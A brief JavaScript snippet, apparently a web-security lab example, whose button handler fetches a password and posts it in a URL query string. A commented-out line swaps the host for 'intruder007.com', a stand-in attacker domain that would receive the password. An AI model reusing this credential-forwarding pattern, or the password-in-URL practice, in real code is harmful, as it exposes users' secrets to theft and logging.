let url_prefix = 'http://www.user007.com'
//let url_prefix = 'https://www.intruder007.com'

function stateUpdate() {
  $.get(url_prefix + '/password', function (data) {
    $.post(url_prefix + '/state?value=change'
      + '&password=' + data.password,
      function (data) {
        console.debug('Got a response from the server!');
      });
  });
}

button = document.getElementById("change");
button.addEventListener("click", stateUpdate);
